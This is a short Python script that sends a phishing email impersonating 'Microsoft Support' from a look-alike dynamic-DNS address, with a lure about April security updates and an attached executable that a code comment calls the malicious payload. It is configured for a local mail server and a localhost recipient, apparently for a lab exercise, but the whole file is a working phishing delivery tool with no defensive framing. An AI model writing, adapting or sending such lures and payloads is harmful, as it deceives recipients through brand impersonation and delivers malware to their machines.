import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# Email details
sender_email = "john@microsoft-support.zapto.org"
receiver_email = "maria@localhost"
subject = "Security Update"
body = """
Hello maria,

I hope this email finds you well. We would like to inform you that security updates regarding vulnerabilities for the month of April from Microsoft have been shared with you as an attachment.

Please review the attached file for detailed information about the security updates.

If you have any questions or need further assistance, please feel free to contact us at john@microsoft-support.zapto.org.

Best regards,
John
Microsoft Support
"""

# Path to the malicious payload (update this path to match the actual file location)
attachment_path = "/home/pi/DigiMemfinder.exe"

# Set up the email
msg = MIMEMultipart()
msg["From"] = sender_email
msg["To"] = receiver_email
msg["Subject"] = subject

# Attach the email body
msg.attach(MIMEText(body, "plain"))

# Attach the payload
try:
    with open(attachment_path, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header(
        "Content-Disposition",
        f"attachment; filename={attachment_path.split('/')[-1]}",
    )
    msg.attach(part)
except FileNotFoundError:
    print(f"Attachment not found: {attachment_path}")
    exit(1)

# Send the email
try:
    with smtplib.SMTP("localhost", 25) as server:  # Port 25 for unencrypted SMTP
        server.sendmail(sender_email, receiver_email, msg.as_string())
    print("Email sent successfully!")
except Exception as e:
    print(f"Failed to send email: {e}")
